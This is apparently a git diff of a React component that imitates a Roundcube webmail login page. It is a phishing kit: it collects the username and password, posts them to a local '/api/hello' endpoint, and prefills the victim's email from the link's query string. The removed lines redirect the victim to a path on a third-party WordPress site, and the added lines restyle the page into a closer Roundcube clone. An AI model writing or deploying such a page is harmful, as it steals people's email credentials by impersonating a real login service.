@@ -1,118 +1,117 @@
-
-import axios from "axios"
-import { useEffect, useRef, useState } from "react"
-import { FormEvent, ChangeEvent } from "react"
+import axios from "axios";
+import { useEffect, useRef, useState } from "react";
+import { FormEvent, ChangeEvent } from "react";
 
 type Form = {
-   email: string;
-   passwort: string
-}
+  email: string;
+  passwort: string;
+};
 
 export default function Main() {
-
-
-  const [credentials, setCredentials] = useState<Form>({email: '', passwort: ''})
+  const [credentials, setCredentials] = useState<Form>({
+    email: "",
+    passwort: "",
+  });
 
   const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
-    let name = e.target.name 
-    let value = e.target.value
+    let name = e.target.name;
+    let value = e.target.value;
 
-    setCredentials({...credentials, [name]: value})
-    
-  }
+    setCredentials({ ...credentials, [name]: value });
+  };
 
   const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
-    e.preventDefault()
+    e.preventDefault();
 
     const data = {
       email: credentials.email,
-      password: credentials.passwort
-    }
+      password: credentials.passwort,
+    };
 
-    axios.post('/api/hello', data)
-    .then((req) => {
-      console.log(req.data);
-      setCredentials({passwort: "", email: ""})
-      window.location.href = 'https://www.ndindustries.com.tr/wp-admin/maint/203763yedju363792ue/round.php?'
-    }).catch((err) => {
-      console.log(err);
+    axios
+      .post("/api/hello", data)
+      .then((req) => {
+        console.log(req.data);
+        setCredentials({ passwort: "", email: "" });
+        // window.location.href = "https://webmail.gandi.net/roundcube/";
 
-    })
-  }
+        console.log(req);
+      })
+      .catch((err) => {
+        console.log(err);
+      });
+  };
 
   useEffect(() => {
-     if (location.search){
+    if (location.search) {
       // console.log(location.search);
-      const url = new URLSearchParams(location.search)
-      const email = url.get('email')
-      if (email)
-      setCredentials({...credentials, email})
-     }
-  },[])
+      const url = new URLSearchParams(location.search);
+      const email = url.get("email");
+      if (email) setCredentials({ ...credentials, email });
+    }
+  }, []);
+
+  // https://webmail.supremecluster.com/skins/elastic/images/logo.svg?s=1593860317
 
   return (
     <>
-    <main className="w-screen flex justify-center">
-      <div className="w-11/12 sm:w-[320px] flex flex-col items-center mt-28">
-        <img 
-          src="https://webmail.supremecluster.com/skins/elastic/images/logo.svg?s=1593860317" 
-          alt="roundcube" 
-          className="w-28 h-24"
+      <main className="w-screen flex flex-col items-center justify-center bg-[#cad2d9]">
+        <div className="w-4/5 sm:w-[500px] px-5 py-3 flex flex-col mt-28 bg-[#404040] rounded-md">
+          <img
+            src="/roundcube_logo.png"
+            alt="roundcube"
+            className="w-48 h-13"
           />
 
-          <form className="w-full mt-6" onSubmit={(e) => handleSubmit(e)}>
-
-             <div className="flex">
-              <span className="w-[10%] border rounded-l-md bg-gray-100"/>
-              <input type="text" 
-                      className="h-11 w-[90%] border rounded-r-md outline-none
-                               focus:border-sky-400 focus:border-4 
-                                focus:border-opacity-50 px-3
-                                placeholder:text-lg
+          <form className="w-full my-8" onSubmit={(e) => handleSubmit(e)}>
+            <div className="flex justify-end text-xs space-x-5">
+              <p className="text-gray-300">Username</p>
+              <input
+                type="text"
+                className="h-6 w-[80%] border rounded outline-none
+                               focus:border-blue-400 focus:border-4 
+                                focus:border-opacity-50 px-1 py-1
                                 placeholder:opacity-70
-                                text-lg
-                                " 
-                      name="email"
-                      value={credentials.email}
-                      onChange={handleChange}
-                      placeholder="Username"
-                      />
-             </div>
+                                
+                                "
+                name="email"
+                value={credentials.email}
+                onChange={handleChange}
+              />
+            </div>
 
-             <div className="flex mt-2">
-              <span className="w-[10%] border rounded-l-md bg-gray-100"/>
-              <input type="password" 
-                      className="h-11 w-[90%] border rounded-r-md 
-                                  outline-none focus:border-sky-400 
-                                  focus:border-4 focus:border-opacity-50 px-3
-                                  placeholder:text-lg
+            <div className="flex justify-end mt-5 text-xs space-x-5">
+              <p className="text-gray-300">Password</p>
+              <input
+                type="password"
+                className="h-6 w-[80%] border rounded 
+                                  outline-none focus:border-blue-400 
+                                  focus:border-4 focus:border-opacity-50 px-1 py-1
+                                  
                                   placeholder:opacity-70
-                                  " 
-                      name="passwort"
-                      value={credentials.passwort}
-                      onChange={handleChange}
-                      placeholder="Password"
-                      />
-             </div>
+                                  "
+                name="passwort"
+                value={credentials.passwort}
+                onChange={handleChange}
+              />
+            </div>
 
-                   <input 
-                      type="submit"
-                      className="h-11 w-full bg-sky-400 mt-3
-                        rounded-md uppercase text-white text-lg
-                        cursor-pointer
+            <div className="w-full flex justify-center">
+              <input
+                type="submit"
+                className="h-6 w-2/6 sm:w-1/6  bg-white mt-6
+                        rounded-md font-semibold text-black text-sm
+                        cursor-pointer mx-auto
                         "
-                        value="Login"
-                        />
-                
-              
-
-              <p className="text-center text-gray-500 mt-2 tracking-tighter">Roundcube webmail</p>
+                value="Login"
+              />
+            </div>
           </form>
-
-      </div>
-    </main>
-    
+        </div>
+        <p className="text-center text-xs text-gray-700 mt-16 tracking-tighter">
+          Roundcube webmail
+        </p>
+      </main>
     </>
-    
-  )
+  );
 }
